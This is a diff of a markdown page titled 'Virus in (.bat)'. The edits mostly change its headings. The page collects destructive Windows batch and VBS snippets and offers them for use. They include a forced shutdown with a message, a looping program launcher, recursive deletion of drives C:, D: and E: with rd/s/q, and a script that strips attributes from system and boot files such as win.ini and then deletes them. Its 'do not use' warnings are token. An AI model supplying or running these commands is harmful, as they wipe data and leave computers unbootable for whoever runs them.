@@ -1,6 +1,6 @@
 ### Virus in (.bat)
 
-Sends a message and shuts down the computer:
+### 1. Sends a message and shuts down the computer:
 
 @echo off
 <br>
@@ -8,9 +8,10 @@ msg * your message
 <br>
 shutdown -c “your message” -s
 <hr>
-A simple virus that causes the computer to give an error.
+
+### 2. A simple virus that causes the computer to give an error:
 <br>
-Save as .VBS file:
+--Save as .VBS file:
 <br>
 Option Explicit
 <br>
@@ -27,7 +28,7 @@ WSHShell.Run “Tourstart.exe”
 Next
 <hr>
 
-Format discs in less than 5 seconds. Only D, E and C:
+### 3. Format discs in less than 5 seconds. Only D, E and C:
 
 rd/s/q D:\
 <br>
@@ -35,12 +36,12 @@ rd/s/q C:\
 <br>
 rd/s/q E:\
 <hr>
-And now more dangerous batch files:
+---And now more dangerous batch files:
 
-Causes the system to crash once then the computer cannot be restarted. 
-It removes everything needed to start the system
+### 4. Causes the system to crash once then the computer cannot be restarted. 
+-It removes everything needed to start the system:
 <br>
-DO NOT USE ON YOURSELF
+### ---DO NOT USE ON YOURSELF
 
 @echo off
 <br>
@@ -61,4 +62,4 @@ attrib -r -s -h c:\windows\win.ini
 del c:\windows\win.ini
 <hr>
 
-!!!DO NOT REPEAT ALL THIS ON YOUR PC!!!
+### !!!DO NOT REPEAT ALL THIS ON YOUR PC!!!
